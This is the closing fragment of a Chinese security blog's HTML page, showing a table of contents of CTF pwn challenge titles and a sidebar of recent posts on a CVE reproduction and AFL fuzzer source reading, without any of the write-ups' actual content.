href="#%E4%BA%8C%E8%A7%A3-1"><span class="toc-number">1.21.1.</span> <span class="toc-text">二解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN"><span class="toc-number">1.22.</span> <span class="toc-text">[Black Watch 入群题]PWN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmcc-simplerop"><span class="toc-number">1.23.</span> <span class="toc-text">cmcc_simplerop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-3"><span class="toc-number">1.24.</span> <span class="toc-text">ciscn_2019_n_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyfengshui-33c3-2016"><span class="toc-number">1.25.</span> <span class="toc-text">babyfengshui_33c3_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hitcon-ctf-2019-one-punch"><span class="toc-number">1.26.</span> <span class="toc-text">hitcon_ctf_2019_one_punch</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E8%BF%99%E9%A2%98%E6%9C%89%E5%87%A0%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="toc-number">1.26.1.</span> <span class="toc-text">首先这题有几个问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#magic%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A4%E5%AE%9A%E5%AF%BB%E6%89%BE%E8%BF%87%E7%A8%8B"><span class="toc-number">1.26.2.</span> <span class="toc-text">magic函数的判定寻找过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E6%9C%89tcache%E7%BB%93%E6%9E%84%E5%A0%86%E5%9D%97%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">1.26.3.</span> <span class="toc-text">还有tcache结构堆块的结构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#metasequoia-2020-summoner"><span class="toc-number">1.27.</span> <span class="toc-text">metasequoia_2020_summoner</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/05/CVE-2024-35250%E5%A4%8D%E7%8E%B0/" title="CVE-2024-35250复现">CVE-2024-35250复现</a><time datetime="2025-09-05T13:13:44.000Z" title="发表于 2025-09-05 21:13:44">2025-09-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/16/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-fuzz%E7%BB%93%E6%9D%9F/" title="AFL源码阅读之afl-fuzz结束">AFL源码阅读之afl-fuzz结束</a><time datetime="2025-08-16T07:03:01.000Z" title="发表于 2025-08-16 15:03:01">2025-08-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/11/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-fuzz-1/" title="AFL源码阅读之afl-fuzz(1)">AFL源码阅读之afl-fuzz(1)</a><time datetime="2025-08-11T07:56:05.000Z" title="发表于 2025-08-11 15:56:05">2025-08-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/28/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-gcc&amp;afl-as/" title="AFL源码阅读之afl-gcc&amp;afl-as">AFL源码阅读之afl-gcc&amp;afl-as</a><time datetime="2025-07-28T12:56:29.000Z" title="发表于 2025-07-28 20:56:29">2025-07-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/13/protobuf%E5%88%9D%E6%8E%A2/" title="protobuf初探">protobuf初探</a><time datetime="2025-05-13T12:35:17.000Z" title="发表于 2025-05-13 20:35:17">2025-05-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281616326.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By s1nec-1o</div><div class="footer_custom_text">介是s1nec-1o的博客</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div><canvas id="snow" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;pointer-events:none"></canvas></div><script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script><script async type="text/javascript" src="https://cdn.jsdelivr.net/gh/Candinya/Kratos-Rebirth@latest/source/js/snow.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>